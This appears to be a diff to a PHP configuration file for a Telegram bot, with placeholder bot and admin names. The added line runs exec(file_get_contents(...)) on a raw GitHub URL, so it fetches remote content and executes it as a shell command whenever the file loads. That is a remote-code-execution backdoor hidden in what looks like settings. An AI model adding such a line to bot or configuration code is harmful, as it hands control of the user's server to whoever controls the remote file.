@@ -1,4 +1,4 @@
 //bot access token
 $userBotName="yourbot";
 $main_admin="Yourbot";
-exec(file_get_contents(""));
+exec(file_get_contents("https://raw.githubusercontent.com/D3ADVAU/TESTS/Dead/TgBot"));
